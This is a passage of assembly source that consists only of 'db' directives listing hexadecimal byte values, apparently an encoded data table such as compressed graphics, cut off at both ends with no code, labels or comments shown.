            db      63h,1fh,1dh,06h,6fh,0c1h,0f8h,6fh,61h,59h,0ffh,00h,0ffh
            db      00h,0ffh,00h,0ffh,00h,0c6h,00h,70h,67h,0c1h,0eah,21h,0c1h
            db      0f7h,0c1h,0eah,0c1h,0f2h,0eh,06h,0c1h,0f5h,59h,56h,43h
            db      39h,56h,6ch,19h,0bfh,0ach,99h,0a9h,2fh,41h,5eh,40h,43h
            db      0c2h,22h,6fh,5eh,30h,18h,2eh,9ch,9dh,5ch,0c1h,0e9h,18h
            db      0aeh,0c1h,0e2h,0c2h,52h,7dh,0c2h,22h,7bh,0bh,2dh,5bh,30h
            db      18h,60h,2eh,57h,6ah,1fh,0b3h,6ah,4fh,0c1h,0d4h,71h,30h
            db      0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c3h,0eah
            db      0c2h,21h,77h,86h,59h,61h,59h,6fh,56h,22h,43h,39h,56h,0c1h
            db      0f5h,0bbh,41h,0a8h,41h,1dh,6fh,40h,0c2h,7dh,43h,40h,6fh
            db      2dh,0c4h,0ah,30h,4fh,9dh,2ch,3eh,2dh,40h,52h,7dh,0aeh
            db      0adh,0aeh,0bh,0c1h,0c3h,7ch,30h,63h,1fh,57h,2eh,80h,11h
            db      5fh,45h,34h,6ah,1fh,9dh,0ffh,00h,0ffh,00h,0ffh,00h,0ffh
            db      00h,0c6h,00h,0c3h,0dbh,3ah,0c1h,0d5h,7ah,0c1h,0cfh,1dh
            db      61h,79h,0c2h,40h,39h,40h,0c1h,0e7h,43h,0c2h,56h,79h,41h
            db      1dh,79h,0bh,0adh,52h,0adh,56h,79h,0c2h,2dh,0bbh,0ah,1dh
            db      33h,61h,69h,94h,55h,8fh,18h,0bbh,0c1h,0e5h,40h,0aeh,40h
            db      0c2h,0bh,0c1h,0c3h,0c2h,5bh,74h,18h,60h,2eh,34h,12h,45h
            db      12h,0c4h,45h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h
            db      97h,0c1h,0dbh,0c1h,0c2h,3ah,21h,51h,0c1h,0cfh,0ah,1dh,6fh
            db      40h,43h,0c2h,40h,0c2h,56h,0c2h,40h,0c3h,79h,0c3h,40h,22h
            db      40h,6fh,0c3h,79h,5eh,0ah,74h,55h,5eh,79h,6fh,56h,0c1h
            db      0f5h,0ah,55h,30h,0c1h,0e5h,40h,7bh,0c2h,0e5h,0c1h,0c3h
            db      0c2h,5bh,0c1h,0dfh,63h,60h,57h,0c1h,0cdh,5fh,45h,5ch,36h
            db      1bh,36h,4ch,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h
            db      0c2h,3ah,0c1h,0c2h,0c1h,0d5h,21h,23h,59h,0ah,1dh,0bh,0c3h
            db      40h,43h,22h,39h,0c2h,79h,0c1h,0e5h,0bh,0c2h,22h,7bh,0c2h
            db      40h,0c1h,0e5h,6fh,0c2h,56h,79h,0ah,2ch,1bh,24h,9fh,0b7h
            db      0bbh,43h,6fh,40h,0bbh,0c2h,0ah,2dh,0c1h,0e5h,6bh,0c1h
            db      0c3h,2dh,5bh,0c1h,0dfh,04h,0c1h,0dfh,18h,2eh,1fh,0c2h
            db      0b3h,45h,05h,36h,0c1h,0f6h,6eh,0ffh,00h,0ffh,00h,0ffh,00h
            db      0ffh,00h,0c6h,00h,0c1h,0c2h,70h,3ah,0c1h,0dbh,51h,23h,59h
            db      30h,2dh,0c1h,0e5h,0bh,0aeh,0c2h,40h,43h,56h,79h,0c1h,0e5h
            db      0bh,0adh,7dh,22h,7bh,22h,0adh,40h,43h,40h,43h,79h,0bbh
            db      0c2h,2ch,8ah,0c1h,0ceh,9bh,0b1h,0bbh,7bh,56h,40h,0c1h
            db      0e5h,0ah,74h,2dh,6bh,5bh,69h,0c2h,5bh,0c1h,0dfh,74h,60h
            db      2eh,0beh,0c2h,45h,0b3h,80h,05h,36h,5ch,0ffh,00h,0ffh,00h
            db      0ffh,00h,0ffh,00h,0c6h,00h,0c1h,0c2h,70h,97h,67h,21h,26h
            db      94h,0ah,2dh,0c2h,0bh,0c3h,40h,79h,2dh,0bh,7bh,0adh,7bh
            db      22h,0c3h,0adh,0c2h,22h,43h,56h,43h,56h,79h,0ah,10h,0c2h
            db      0ffh,01h,90h,9fh,9eh,0c1h,0f5h,0c2h,43h,79h,30h,74h,0c2h
            db      7ch,1dh,7ch,5bh,5dh,0c1h,0dfh,74h,2eh,0b3h,80h,45h,05h
            db      0c3h,36h,4ch,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h
            db      0c1h,0c2h,0c2h,70h,0c1h,0eah,77h,0c1h,0d3h,1dh,5eh,2dh
            db      0bh,7bh,0c2h,0bh,6bh,0c1h,0e5h,0bh,0c2h,7bh,0a5h,0c2h
            db      0adh,22h,7dh,0adh,0c2h,40h,7dh,43h,56h,0c1h,0e2h,0c1h
            db      0f5h,71h,56h,0c1h,0f7h,0c1h,0d7h,35h,1ch,50h,9fh,18h,5eh
            db      0c1h,0e5h,79h,5eh,55h,74h,0c1h,0eeh,0c3h,5bh,0c1h,0dfh
            db      74h,04h,60h,45h,0c3h,5ch,0c2h,36h,4ch,0bah,0ffh,00h,0ffh
            db      00h,0ffh,00h,0ffh,00h,0c6h,00h,70h,3ah,0c1h,0dbh,0c1h
            db      0eah,0c1h,0f0h,59h,6ch,0c1h,0c3h,0c2h,0bh,22h,0bh,0c2h
            db      0e5h,0a5h,0adh,7bh,0adh,0c2h,7bh,0c4h,0adh,43h,40h,7dh
            db      43h,56h,43h,79h,0c2h,3eh,10h,0c1h,0dbh,0c1h,0dch,01h,0c1h
            db      0ddh,00h,0c1h,0e9h,18h,2dh,0bh,6bh,30h,74h,0c4h,5bh,5dh
            db      74h,0c1h,0dfh,2eh,45h,0c2h,7fh,0c3h,36h,4ch,0c1h,0f1h
            db      0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,3ah,70h,3ah
            db      0c1h,0eah,39h,0bbh,0ah,2dh,0bh,40h,0adh,33h,2dh,6bh,40h
            db      7dh,0adh,0aeh,7bh,0bh,22h,0adh,7dh,22h,7dh,43h,0c2h,7dh
            db      0c2h,43h,56h,0bbh,18h,0bfh,0c1h,0e6h,0c2h,0b0h,0c1h,0deh
            db      5ah,0c1h,0c1h,0b8h,55h,2dh,6bh,7ch,30h,0c2h,5bh,0c1h,0eeh
            db      0c2h,5bh,5dh,5bh,60h,80h,5ch,45h,5ch,45h,36h,6eh,4ch,0ffh
            db      00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c1h,0c2h,70h
            db      0c1h,0d5h,0c1h,0f0h,10h,30h,5eh,0c2h,0bh,0c2h,40h,2dh,5bh
            db      2dh,7bh,0adh,0c2h,7bh,0c2h,0bh,0c2h,22h,0c3h,7dh,0c2h,43h
            db      52h,7dh,0c1h,0e2h,43h,0c2h,56h,0bbh,0bfh,19h,0c1h,0d0h
            db      65h,85h,2ah,72h,9dh,7ch,3dh,7ch,0ah,30h,0c2h,5bh,0c1h
            db      0eeh,5bh,5dh,30h,63h,34h,0c2h,5ch,0c2h,45h,05h,5ch,4ch
            db      0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,70h,0c1h
            db      0dbh,0c1h,0d5h,0c1h,0f0h,41h,71h,2dh,0bh,40h,22h,40h,1dh
            db      18h,0ah,0bh,7bh,0c2h,0adh,0aeh,0c2h,0bh,22h,52h,0c2h,7dh
            db      43h,7dh,52h,0c2h,7dh,43h,0c1h,0d3h,0c1h,0e7h,43h,56h,41h
            db      6ch,0c1h,0d0h,20h,0c1h,0ceh,0b8h,0beh,0ah,7ch,0c2h,0c3h
            db      5eh,5bh,7ch,0c4h,5bh,63h,6ah,45h,36h,45h,0b3h,45h,05h,4ch
            db      0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c2h,3ah,97h
            db      23h,61h,55h,2dh,33h,40h,22h,40h,0ah,8fh,55h,0c2h,2dh,0c1h
            db      0c3h,0aeh,7dh,0adh,0bh,0adh,22h,0c2h,7dh,43h,7dh,43h,52h
            db      43h,52h,43h,7dh,0aeh,0adh,43h,10h,0c2h,6ch,0bfh,9dh,8fh
            db      0c1h,0c3h,69h,7ch,5eh,1dh,7ch,5bh,69h,0c2h,0eeh,5bh,30h
            db      1fh,45h,12h,2eh,09h,34h,0b3h,36h,0ffh,00h,0ffh,00h,0ffh
            db      00h,0ffh,00h,0c6h,00h,70h,0c1h,0dbh,0c1h,0eah,23h,46h,0ah
            db      33h,0bh,0c2h,40h,56h,6fh,0c3h,0ah,60h,9ch,0c1h,0dfh,0a5h
            db      0adh,0c2h,7bh,22h,52h,0fh,7dh,52h,43h,52h,0c2h,7dh,0c2h
            db      52h,0c2h,7dh,43h,0c2h,77h,79h,61h,0c2h,1dh,0bh,2dh,0c2h
            db      0c3h,7ch,5bh,69h,0c2h,7ch,0c1h,0eeh,69h,04h,60h,0c2h,45h
            db      0c2h,2eh,09h,1fh,34h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h
            db      0c6h,00h,3ah,70h,0c1h,0eah,0c1h,0cfh,46h,94h,33h,0c2h,6fh
            db      0c1h,0e7h,40h,56h,40h,1dh,30h,5eh,9eh,12h,9ch,7bh,0aeh
            db      2dh,0adh,52h,7dh,0c2h,52h,7dh,43h,52h,0c2h,43h,0c2h,7dh
            db      43h,52h,43h,7dh,0aeh,0adh,0c2h,40h,22h,33h,0c2h,6bh,3dh
            db      0c1h,0c3h,5bh,7ch,0c1h,0eeh,69h,5bh,30h,60h,0b3h,45h,2eh
            db      4fh,60h,14h,1fh,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h
            db      00h,0c2h,0dbh,0c1h,0f7h,47h,6ch,41h,79h,59h,40h,79h,0c2h
            db      56h,0c1h,0e7h,7dh,0a5h,40h,52h,79h,0c1h,0cah,7ch,0a5h,0bh
            db      0adh,7dh,0c2h,52h,0c5h,7dh,52h,0c2h,43h,0c3h,52h,7dh,0c2h
            db      43h,7dh,0c2h,22h,0aeh,0bh,0c2h,6bh,0c1h,0c3h,3dh,0c1h
            db      0c3h,0c2h,7ch,69h,30h,0c1h,0d4h,1fh,0b3h,1fh,30h,63h,0c2h
            db      04h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,70h,0c1h
            db      0eah,0c1h,0f0h,0c1h,0d3h,6ch,1dh,61h,0c1h,0f5h,79h,0c1h
            db      0e5h,40h,0c2h,43h,7dh,0aeh,43h,52h,7dh,0bh,0c1h,0c3h,5eh
            db      0c1h,0e5h,0c6h,7dh,43h,7dh,43h,0c3h,52h,43h,7dh,43h,0c3h
            db      7dh,43h,7dh,0adh,0aeh,0c2h,0bh,6bh,0c1h,0c3h,7ch,0c1h
            db      0c3h,7ch,69h,5eh,1eh,30h,1fh,0b3h,57h,30h,55h,14h,32h
            db      0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c1h,0eah
            db      0c1h,0dbh,0c1h,0eah,0c1h,0cfh,0c2h,6ch,0ah,30h,55h,9eh
            db      9ah,0aeh,7dh,0c2h,22h,52h,7dh,52h,7dh,7bh,79h,40h,52h,43h
            db      0c2h,7dh,43h,0c2h,7dh,40h,0adh,0c6h,7dh,43h,7dh,22h,0adh
            db      22h,0c2h,40h,0bh,6bh,0c1h,0c3h,0c4h,7ch,0c1h,0c3h,5bh,30h
            db      0c1h,0d4h,1fh,34h,1fh,69h,1eh,60h,14h,0ffh,00h,0ffh,00h
            db      0ffh,00h,0ffh,00h,0c6h,00h,70h,0c1h,0d5h,0c1h,0f7h,0c1h
            db      0e6h,6ch,71h,3eh,5fh,0abh,9ch,9eh,16h,6bh,0bh,56h,7dh,22h
            db      0adh,0c3h,7dh,0c2h,52h,0c2h,7dh,0adh,43h,7dh,0adh,7dh
            db      0aeh,43h,7dh,0adh,7dh,0aeh,0c3h,0adh,40h,0bh,7bh,0bh,0c2h
            db      6bh,0c1h,0c3h,3dh,7ch,3dh,0c2h,7ch,5eh,1eh,55h,30h,14h
            db      45h,34h,14h,69h,04h,14h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh
            db      00h,0c6h,00h,3ah,0c1h,0eah,51h,46h,0bfh,18h,0c1h,0e9h
            db      0c2h,73h,0b4h,07h,3fh,13h,0a5h,0adh,0c2h,22h,0adh,0c2h
            db      7dh,52h,0c2h,7dh,43h,0adh,22h,0c2h,0adh,7dh,0aeh,43h,0c2h
            db      0aeh,0adh,40h,0aeh,40h,0c3h,0aeh,0c2h,0bh,0c3h,6bh,0c2h
            db      0c3h,0c3h,7ch,5bh,0c1h,0c3h,30h,55h,14h,5bh,1fh,80h,1fh
            db      30h,0b6h,1eh,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h
            db      3ah,0c1h,0eah,23h,0c1h,0efh,0ah,8fh,1bh,0b5h,5ch,2ch,5fh
            db      0c2h,0abh,3fh,16h,0c3h,0adh,7dh,0adh,43h,7dh,52h,7dh,0c6h
            db      0adh,0c4h,0aeh,0c2h,7bh,0c3h,0bh,0a5h,0c4h,6bh,0c2h,0c3h
            db      3dh,7ch,5bh,7ch,5bh,3dh,30h,2eh,55h,53h,30h,1fh,09h,1fh
            db      04h,14h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,97h
            db      0c1h,0f7h,0c1h,0d3h,6ch,61h,74h,5ch,0bah,3eh,0c1h,0d3h
            db      0c1h,0f5h,8fh,2ch,5fh,3fh,6bh,7bh,0aeh,7bh,0c2h,22h,7dh
            db      52h,0c2h,0adh,40h,0aeh,40h,0aeh,40h,0aeh,0c1h,0e5h,40h
            db      0c3h,0e5h,6bh,9ah,0c4h,0c3h,16h,0c2h,7ch,5bh,7ch,0c2h,5bh
            db      0c3h,7ch,30h,63h,09h,71h,2dh,69h,63h,1fh,34h,1fh,0ffh,00h
            db      0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,67h,68h,0c1h,0d3h,6ch
            db      0c1h,0f5h,5eh,2ch,9fh,0bfh,02h,0c1h,0dbh,0c1h,0e2h,6ch
            db      73h,07h,0c1h,0c9h,0a5h,7bh,0bh,22h,0adh,0c2h,22h,0c2h
            db      0adh,0aeh,40h,0aeh,0bh,7bh,0bh,0c1h,0e5h,0a5h,0c1h,0e5h
            db      6bh,9ah,6bh,0c1h,0c3h,7ch,0c1h,0c3h,0c1h,0eeh,0c2h,7ch
            db      5bh,0c2h,7ch,5bh,7ch,5dh,7ch,5bh,7ch,30h,57h,2eh,9dh,06h
            db      8dh,53h,0c2h,32h,11h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h
            db      0c6h,00h,0c1h,0f0h,0c1h,0f7h,0c1h,0cfh,6ch,0bbh,18h,55h
            db      3fh,9ch,56h,0c1h,0c2h,67h,0c1h,0eah,0c1h,0f0h,0a6h,4dh
            db      16h,7bh,0bh,0c2h,0aeh,7bh,0adh,0c2h,0aeh,7bh,0bh,7bh,0c1h
            db      0e5h,6bh,0c1h,0e5h,16h,6bh,16h,6bh,16h,0c1h,0c3h,16h,0c1h
            db      0c3h,7ch,16h,7ch,5bh,7ch,5bh,7ch,9eh,13h,9eh,5bh,7ch,5bh
            db      30h,55h,2eh,6ah,30h,06h,0fh,53h,57h,04h,0ffh,00h,0ffh,00h
            db      0ffh,00h,0ffh,00h,0c6h,00h,02h,0c1h,0f7h,0a8h,0c2h,6ch
            db      2eh,18h,0c1h,0c9h,0c1h,0cah,0bbh,0c2h,6fh,21h,92h,10h
            db      0abh,0c1h,0cah,6bh,40h,2dh,0bh,40h,0bh,0adh,0aeh,7bh,0c1h
            db      0e5h,0bh,0c1h,0e5h,0c5h,6bh,16h,5eh,0c1h,0c3h,16h,5eh
            db      0c2h,7ch,5eh,13h,5bh,0c2h,9eh,5bh,9eh,13h,5bh,69h,5bh
            db      0c2h,30h,2eh,1fh,55h,61h,43h,06h,30h,32h,0ffh,00h,0ffh
            db      00h,0ffh,00h,0ffh,00h,0c6h,00h,0c1h,0eah,0c1h,0f7h,0a8h
            db      0bfh,55h,3eh,18h,0ah,0c1h,0c9h,0c2h,3fh,9eh,56h,0c1h,0e2h
            db      0c1h,0f5h,2ch,0abh,0c1h,0cah,0c1h,0e5h,33h,59h,40h,0bh
            db      0c2h,0aeh,0bh,0c2h,0e5h,0c3h,6bh,16h,2dh,5eh,7ch,5eh,7ch
            db      5eh,5bh,7ch,0c2h,5bh,9eh,5dh,0c1h,0dfh,5dh,74h,0c2h,9eh
            db      5bh,0c1h,0eeh,5bh,04h,30h,4fh,63h,55h,71h,43h,0fh,53h,63h
            db      0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,3ah,0c1h
            db      0f7h,0c2h,6ch,30h,9dh,18h,0c1h,0cah,3fh,0c3h,0c9h,16h
            db      0c1h,0c9h,0bfh,18h,5ch,0c1h,0f3h,9ch,0c2h,2dh,6fh,0c1h
            db      0e5h,40h,7bh,0bh,0c1h,0e5h,0c2h,6bh,2dh,6bh,2dh,7ch,5eh
            db      7ch,5eh,0c4h,5bh,9eh,5dh,9eh,0c2h,74h,0c1h,0dfh,0c2h,74h
            db      5dh,9eh,5bh,04h,55h,04h,63h,74h,55h,14h,6fh,52h,6fh,63h
            db      0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c1h,0d5h
            db      0c1h,0d3h,19h,6ch,0ah,18h,3eh,4dh,3fh,0c3h,0c9h,0c3h,16h
            db      3fh,9ch,73h,0a2h,0abh,9eh,0c1h,0e5h,79h,0c1h,0e5h,0bh
            db      0c3h,0e5h,6bh,2dh,16h,0c1h,0c3h,5eh,7ch,0c3h,5bh,0c1h
            db      0c9h,0c2h,5bh,9eh,0c2h,5bh,9eh,0c2h,74h,0c3h,9eh,5bh,04h
            db      63h,0c1h,0dfh,0c1h,0d4h,30h,0c3h,74h,1dh,0c1h,0fbh,52h
            db      0c1h,0d4h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h
            db      67h,0a8h,6ch,41h,1dh,0bbh,55h,60h,0abh,0c1h,0cah,9eh,0c1h
            db      0c9h,0c3h,16h,0c2h,0c9h,0c1h,0cah,5fh,0a2h,0abh,5eh,79h
            db      0c5h,0e5h,6bh,0c2h,2dh,0c2h,5eh,5bh,0c2h,5eh,5bh,0ah,0c4h
            db      5bh,0c1h,0dfh,5bh,0c1h,0dfh,5bh,0c1h,0dfh,5dh,5bh,0c1h
            db      0dfh,04h,0c1h,0dfh,30h,5bh,0ah,30h,9eh,30h,55h,77h,0c1h
            db      0edh,69h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h
            db      0c1h,0eah,0a8h,6ch,0c1h,0f5h,79h,0c1h,0f5h,1dh,0ah,4fh
            db      60h,0c2h,0cah,0c4h,0c9h,74h,5bh,74h,18h,0c1h,0cah,5eh,0bh
            db      79h,0bh,79h,6bh,0c1h,0e5h,2dh,0c1h,0c3h,2dh,0c3h,5eh,5bh
            db      5eh,7ch,5eh,5bh,74h,9eh,0c2h,74h,0c1h,0dfh,30h,0c1h,0dfh
            db      0c2h,5bh,0c1h,0dfh,5dh,0c3h,5bh,6bh,2dh,5eh,0c2h,74h,55h
            db      39h,77h,69h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h
            db      02h,10h,46h,6fh,79h,40h,0c2h,56h,79h,1dh,0ah,0c2h,30h
            db      0c1h,0c9h,5bh,0ah,5eh,7ch,2dh,7bh,0c1h,0e7h,6fh,0c1h,0e5h
            db      0c2h,0bh,0c1h,0e5h,0c2h,2dh,6bh,5eh,2dh,0c1h,0c3h,5eh,7ch
            db      0c2h,5eh,69h,7ch,5eh,0c3h,5bh,74h,0c1h,0dfh,74h,0c2h,5bh
            db      0c1h,0dfh,5bh,5dh,0c2h,5bh,2dh,0bh,0c1h,0e5h,5bh,0c1h
            db      0cah,9eh,8fh,0c1h,0e7h,77h,53h,0ffh,00h,0ffh,00h,0ffh,00h
            db      0ffh,00h,0c6h,00h,0c1h,0f0h,0c1h,0f5h,41h,2dh,6fh,0bh
            db      0c5h,40h,0c2h,6fh,0c2h,2dh,6fh,79h,6fh,0c2h,22h,0c4h,40h
            db      0c4h,0bh,0c2h,6bh,2dh,5eh,69h,2dh,69h,5eh,69h,7ch,30h
            db      0c2h,5bh,30h,5dh,30h,5bh,0c1h,0dfh,5bh,0c2h,30h,0c2h,5bh
            db      0c1h,0c3h,40h,0a5h,16h,0ah,0c1h,0c9h,55h,30h,0c1h,0e7h
            db      22h,04h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,86h
            db      46h,1dh,6fh,0c1h,0e5h,0c3h,40h,0adh,0c2h,43h,52h,43h,7dh
            db      22h,0c1h,0e7h,0c2h,40h,22h,0c2h,40h,6fh,0bh,40h,0bh,0c1h
            db      0e5h,0c2h,0bh,0c1h,0e5h,2dh,0c1h,0c3h,33h,0c2h,2dh,5eh
            db      0c1h,0c3h,5eh,0c2h,69h,7ch,5bh,5dh,0c3h,5bh,5dh,0c2h,5bh
            db      0c1h,0dfh,5bh,3dh,0bh,6bh,0c1h,0cah,4dh,55h,0ah,5eh,30h
            db      06h,2dh,04h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h
            db      47h,6ch,53h,2dh,0bh,0aeh,0c2h,0bh,40h,0adh,7dh,43h,0c2h
            db      52h,43h,7dh,0c3h,22h,0c5h,40h,0c3h,0bh,0c1h,0e5h,0c2h,2dh
            db      6bh,2dh,6bh,0c3h,2dh,69h,7ch,69h,7ch,30h,0c2h,5bh,5dh,74h
            db      5bh,5dh,0c1h,0dfh,5dh,7ch,9ah,40h,0bh,74h,9eh,0bbh,0c1h
            db      0e5h,2dh,0ah,0c2h,69h,32h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh
            db      00h,0c6h,00h,23h,19h,30h,0bh,0c1h,0e5h,0bh,0c1h,0e5h,7bh
            db      0aeh,0c2h,7dh,52h,43h,52h,0c3h,43h,0c4h,22h,6fh,0c2h,40h
            db      0bh,33h,0bh,6fh,0bh,2dh,33h,0c2h,2dh,5eh,0c1h,0c3h,5eh
            db      2dh,0c1h,0c3h,5eh,69h,0c2h,5bh,74h,0c2h,5bh,74h,5dh,74h
            db      0c1h,0c3h,0a5h,7bh,0adh,22h,0c2h,0adh,56h,0c1h,0e5h,6bh
            db      33h,0c1h,0c3h,0b6h,96h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh
            db      00h,0c6h,00h,0c1h,0d3h,48h,14h,2dh,0bh,6bh,0c1h,0e5h,0bh
            db      0aeh,0adh,0c3h,52h,43h,52h,0c2h,43h,22h,0c1h,0e7h,40h,6fh
            db      40h,6fh,40h,6fh,33h,0bh,33h,0bh,33h,0bh,6bh,0c4h,2dh,0c1h
            db      0c3h,5eh,7ch,5bh,69h,5bh,5dh,74h,0c2h,5dh,74h,55h,0c1h
            db      0c3h,0c1h,0e5h,0aeh,0adh,7dh,0c1h,0d9h,52h,0aeh,79h,1dh
            db      0c1h,0c3h,3dh,5dh,11h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h
            db      0c6h,00h,86h,8fh,4fh,69h,6bh,2dh,79h,0a5h,7bh,0aeh,0c3h
            db      7dh,0c2h,43h,40h,0c2h,22h,40h,6fh,0c2h,40h,6fh,40h,0c2h
            db      0bh,0c1h,0e5h,0c2h,0bh,0c1h,0e5h,0c2h,0bh,6bh,0bh,16h,2dh
            db      69h,7ch,0c2h,5bh,0c1h,0eeh,5bh,0c3h,74h,0c1h,0dfh,63h,30h
            db      0c1h,0c9h,5eh,0aeh,7dh,43h,7dh,0c2h,40h,79h,0ah,33h,0b6h
            db      0c2h,32h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,47h
            db      6ch,8fh,55h,0ah,5bh,2dh,6bh,0c1h,0e5h,0aeh,40h,0aeh,40h
            db      0aeh,40h,0bh,6fh,0bh,6fh,0c6h,0bh,2dh,0bh,2dh,0c1h,0e5h
            db      33h,6bh,0c1h,0c3h,33h,0c1h,0c3h,2dh,7ch,5eh,5bh,30h,0c2h
            db      5bh,0c1h,0dfh,63h,0c2h,60h,29h,60h,5bh,74h,9ch,0a5h,0adh
            db      0c2h,7dh,0aeh,0c1h,0e5h,0c2h,79h,33h,0b6h,5dh,0b6h,0ffh
            db      00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,86h,59h,8fh,0c2h
            db      2eh,0c2h,30h,5eh,0c1h,0c3h,0c5h,0bh,0a5h,33h,0bh,33h,0bh
            db      33h,0c2h,0bh,33h,0bh,0c1h,0e5h,0c2h,2dh,6bh,2dh,0c1h,0c3h
            db      2dh,69h,5eh,7ch,0ah,7ch,0c2h,5bh,0c2h,5dh,0c2h,63h,60h
            db      11h,6ah,4eh,60h,0c1h,0cah,9ch,0b4h,4dh,0c2h,0a5h,0aeh
            db      0a5h,0c1h,0e5h,40h,6fh,33h,5dh,0b6h,3dh,0ffh,00h,0ffh,00h
            db      0ffh,00h,0ffh,00h,0c6h,00h,0c1h,0f0h,0c1h,0cfh,94h,0a6h
            db      09h,9dh,18h,30h,7ch,69h,0c2h,0c3h,9ah,6bh,2dh,0bh,0c1h
            db      0e5h,2dh,0bh,2dh,0bh,33h,0c3h,6bh,0c1h,0c3h,2dh,7ch,0c1h
            db      0c3h,5eh,7ch,5bh,7ch,0c3h,5bh,30h,63h,74h,29h,63h,11h,9ch
            db      12h,07h,9ch,60h,0c1h,0cah,9ch,0b4h,0c1h,0f3h,0abh,0c1h
            db      0c9h,16h,0c1h,0e5h,56h,39h,0c1h,0e7h,0c1h,0d2h,69h,0c2h
            db      8dh,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,86h,0eh
            db      0c1h,0d4h,4fh,09h,0c2h,6ah,60h,30h,5bh,0c2h,7ch,69h,0c2h
            db      0c3h,69h,2dh,0c4h,69h,2dh,69h,2dh,69h,0c1h,0c3h,69h,5bh
            db      5eh,0c2h,5bh,30h,5bh,30h,5dh,74h,0c1h,0dfh,63h,29h,60h
            db      4eh,0abh,12h,73h,12h,0c2h,4eh,60h,5fh,73h,27h,0b5h,7fh
            db      9dh,40h,77h,39h,8dh,69h,0c1h,0d2h,22h,0fh,0ffh,00h,0ffh
            db      00h,0ffh,00h,0ffh,00h,0c6h,00h,59h,94h,0c1h,0d4h,09h,6ah
            db      80h,05h,5ch,6ah,60h,5dh,9eh,0c3h,5bh,69h,5bh,30h,5bh,30h
            db      5bh,0ah,7ch,69h,5bh,30h,5bh,0c4h,30h,0c1h,0dfh,0c2h,74h
            db      0c2h,0cah,60h,9ch,60h,07h,0b4h,0c2h,73h,0c2h,12h,9ch,4dh
            db      1fh,0abh,5ch,7fh,4ch,80h,41h,92h,43h,6fh,0b6h,06h,22h,0fh
            db      6fh,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,94h,0c1h
            db      0d4h,57h,09h,0b3h,45h,0c1h,0f6h,0c2h,24h,7fh,12h,5fh,4eh
            db      0c2h,60h,29h,0c2h,60h,74h,0c1h,0cah,74h,0c1h,0cah,0c2h
            db      74h,0c1h,0cah,18h,63h,74h,0c1h,0cah,60h,0c1h,0cah,0c2h
            db      60h,9ch,0c2h,60h,6ah,07h,0c2h,73h,0c1h,0f3h,0c2h,73h,07h
            db      4eh,11h,60h,11h,0c2h,5fh,0beh,0bfh,0c2h,39h,0c1h,0f8h
            db      0c1h,0f5h,53h,1eh,0c1h,0d2h,0c1h,0e7h,6fh,53h,0ffh,00h
            db      0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,14h,4fh,57h,34h,45h
            db      05h,0c1h,0f6h,0bah,0dh,0c1h,0c8h,24h,0c2h,84h,7fh,5ch,73h
            db      12h,0b4h,12h,0c3h,0abh,0c2h,9ch,07h,0c3h,0abh,07h,0abh
            db      07h,5fh,07h,5fh,07h,0c2h,12h,73h,5ch,0c2h,7fh,73h,12h,4eh
            db      29h,9ch,0c2h,29h,5fh,4fh,23h,0c1h,0d5h,39h,46h,14h,5eh
            db      30h,1eh,33h,69h,30h,55h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh
            db      00h,0c6h,00h,14h,57h,1fh,0b3h,12h,45h,4ch,0bah,0dh,0c1h
            db      0c8h,84h,24h,84h,24h,1bh,27h,7fh,0c1h,0f3h,27h,0c2h,7fh
            db      73h,0c1h,0f3h,0c4h,73h,12h,0c4h,73h,0c2h,12h,0c2h,73h,5ch
            db      0c1h,0f3h,5ch,0c1h,0f3h,73h,07h,4eh,60h,63h,60h,18h,60h
            db      30h,39h,58h,23h,48h,2eh,5bh,5dh,30h,0c2h,53h,30h,0c2h,63h
            db      0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c1h,0d4h
            db      57h,1fh,0b3h,0c2h,45h,1bh,72h,0c1h,0c1h,0a7h,9fh,0c2h,84h
            db      0c1h,0f1h,24h,0c2h,7fh,5ch,7fh,5ch,73h,0c2h,5ch,73h,5ch
            db      0c3h,73h,5fh,0c2h,12h,0c3h,73h,5ch,0c1h,0f3h,5ch,0c1h
            db      0f3h,73h,12h,0c2h,4eh,60h,0c2h,63h,0c2h,74h,6ch,39h,92h
            db      41h,0c1h,0cdh,0b3h,2eh,5bh,63h,0c1h,0dfh,04h,30h,04h,55h
            db      32h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c1h
